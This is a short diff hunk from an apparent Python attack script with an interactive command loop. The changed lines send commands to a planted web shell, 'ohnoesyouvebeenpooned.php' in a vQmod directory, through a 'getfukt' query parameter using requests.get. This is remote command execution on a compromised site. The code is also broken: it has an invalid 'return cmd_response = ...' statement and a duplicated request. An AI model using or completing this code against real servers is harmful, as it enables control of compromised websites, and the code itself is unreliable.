@@ -98,8 +98,8 @@ class loop(Cmd):
         print(response)
 
     def getfuktm8(cmd):
-        target = url + "../vqmod/xml/ohnoesyouvebeenpooned.php?getfukt=" cmd
-        r = 
+        target = url + "../vqmod/xml/ohnoesyouvebeenpooned.php?getfukt=" + cmd
+        r = requests.get(target)
         try:
             return cmd_response = requests.get(target)
         except:
